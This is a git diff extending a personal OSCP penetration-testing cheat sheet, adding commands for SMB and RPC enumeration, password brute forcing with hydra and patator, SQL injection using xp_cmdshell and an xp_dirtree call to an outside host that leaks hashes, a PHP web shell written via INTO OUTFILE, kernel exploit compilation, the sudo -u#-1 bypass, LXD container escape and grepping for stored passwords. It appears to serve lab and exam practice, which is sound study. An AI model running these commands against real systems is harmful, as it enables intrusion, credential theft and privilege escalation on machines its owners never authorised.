@@ -6,6 +6,7 @@ https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html
 https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html
 https://blog.adithyanak.com/oscp-preparation-guide/linux-privilege-escalation
 https://hausec.com/pentesting-cheatsheet/#_Toc475368980
+https://guide.offsecnewbie.com/5-sql
 
 
 # Recon
@@ -14,7 +15,9 @@ https://hausec.com/pentesting-cheatsheet/#_Toc475368980
 ping <IP> -R
 ping <IP> -c 3 # View TTL
 ```
-
+```bash
+lsoft -i:53
+```
 ### nmap
 ```bash
 nmap -Pn -sT -sV -n <IP> -p- --min-rate 1000 --max-retries 2 --reason
@@ -22,6 +25,7 @@ nmap -Pn -sT -sV -sC -n <IP> -p <PORTS>
 nmap -Pn -sT -A -n <IP> -p <PORTS>
 
 nmap -Pn -sT -sV --script http-enum -n <IP> -p <PORT> 
+nmap -Pn -sT -sV -n <IP> -p 80 --script http-enum --script-args http-enum.basepath="dev/"
 
 nmap -Pn -sT -n --script smb-enum-shares.nse <IP> -p 135,139,445
 nmap -p <PORT> <IP> --script smb-ls --script-args 'share=IPC$'
@@ -52,6 +56,19 @@ LIST
 RETR 1
 ```
 
+### RPC
+```bash
+#rpcclient -U "" <IP>
+>srvinfo # operating system version
+>netshareenumall # enumerate all shares and its paths
+>enumdomusers -->rid
+>enumdomgroups
+>querygroupmem 0x200  --> (rid) *rid group
+>queryuser --> 0x1f4 *rid user
+>getdompwinfo # smb password policy configured on the server
+```
+
+
 ### SMB
 ```bash
 smbclient -L <IP> -N
@@ -61,12 +78,22 @@ smbclient //<IP>/print$ -N -m SMB2
 ```
 ```bash
 crackmapexec smb 192.168.135.90 -u '' -p ''
+crackmapexec -u 'guest' -p '' --shares $ip
+crackmapexec -u 'guest' -p '' --rid-brute 4000 $ip
+crackmapexec -u 'guest' -p '' --users $ip
 ```
 ```bash
 mount -t cifs //<IP>/IPC$ /tmp -o username=null,password=null,domain=WORKGROUP
 ```
 ```bash
 smbmap -H <IP> -u ''
+smbmap -H <IP> -r carpeta
+smbmap -H <IP> --download general/file.txt
+smbmap -u guest -p '' -H <IP>
+```
+```bash
+enum4linux -a <IP>
+enum4linux -u 'guest' -p '' -a <IP>
 ```
 
 ### http
@@ -180,7 +207,14 @@ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force # $1$ MD5
 ```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh
 hydra -f -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
+hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> smb
 ```
+Patator 0.6
+```bash
+patator http_fuzz url=http://<IP>/department/login.php method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid Password!'
+patator ssh_login host=10.10.10.76 port=22022 user=sammy password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
+```
+
 ```bash
 ncrack -u seppuku -P password.lst -v ssh://192.168.135.90
 ```
@@ -228,9 +262,20 @@ WHOIS
 ```
 
 ### SQL
+https://guide.offsecnewbie.com/5-sql
 ```bash
 ' or 1=1 --
 ```
+```bash
+https://guide.offsecnewbie.com/5-sql
+sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+1> xp_cmdshell 'type c:\users\administrator\desktop\proof.txt'
+2> go
+1> xp_cmdshell 'whoami'
+2> go
+admin');exec+master.dbo.xp_dirtree+'\\192.168.119.152\test,3,2';+--
+```
+
 ```bash
 select load_file('/etc/passwd');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
@@ -276,6 +321,10 @@ curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/acces
 LFI + PHPinfo
 https://www.insomniasec.com/downloads/publications/phpinfolfi.py
 https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
+
+LFI mail
+https://guide.offsecnewbie.com/network-pen#things-to-remember
+
 ```
 
 ### Interactive shell
@@ -333,8 +382,15 @@ https://academy.hackthebox.com/course/preview/linux-privilege-escalation/introdu
 cat /etc/issue
 uname -r
 arch
-searchsploit dirty
+searchsploit linux kernel ubuntu 16.04
+
+gcc 43418.c -o exploit 
+gcc -m64 44298.c -o 44298
+gcc -m32 44298.c -o 44298
 ```
+
+DirtyCow
+https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions
 
 DirtyCow - Error cc1
 ```bash
@@ -393,9 +449,15 @@ https://github.com/pentestmonkey/unix-privesc-check
 /usr/share/nginx/html/
 find /-name *config*.php
 /var/www/html/sites/default/settings.php #Drupal
+grep -r -i -E "user|pass|auth|key|db|database"
 ```
 
 ### SUDO
+
+sudo 1.8.27
+```bash
+sudo -u#-1 /bin/bash
+```
 ```bash
 sudo -l
 ```
@@ -479,6 +541,7 @@ cat /etc/cron.deny
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 ls -la /usr/local/sbin/cron-logrotate.sh
+grep "CRON" /var/log/cron.log
 
 ps -aux | more
 ```
@@ -498,8 +561,10 @@ while true; do
 done
 ```
 
-## Containers
+### Containers
 https://www.hackingarticles.in/lxd-privilege-escalation/
+https://p0i5on8.github.io/posts/hackthebox-brainfuck/
+
 ```bash
 kali$ id
 kali$ git clone https://github.com/saghul/lxd-alpine-builder.git
@@ -515,7 +580,7 @@ bash$ /snap/bin/lxc init imagen ignite -c security.privileged=true
 bash$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 ```
 
-## Chrootkit
+### Chrootkit
 https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/
 ```bash
 chkrootkit -V
@@ -524,9 +589,14 @@ chmod 777 /tmp/update
 # execute the chkrootkit command for a cron job
 ```
 
-## Cipher
+### Cipher
 https://www.dcode.fr/cipher-identifier
 https://gchq.github.io/CyberChef/
 https://www.tunnelsup.com/hash-analyzer/
 https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
 https://asecuritysite.com/encryption/ferdecode
+MD5 hashes.org
+https://cryptii.com/pipes/caesar-cipher
+
+### Buffer Overflow
+https://github.com/Arken2/Everything-OSCP/blob/master/Checklists/WindowsBufferOverflowChecklist.pdf
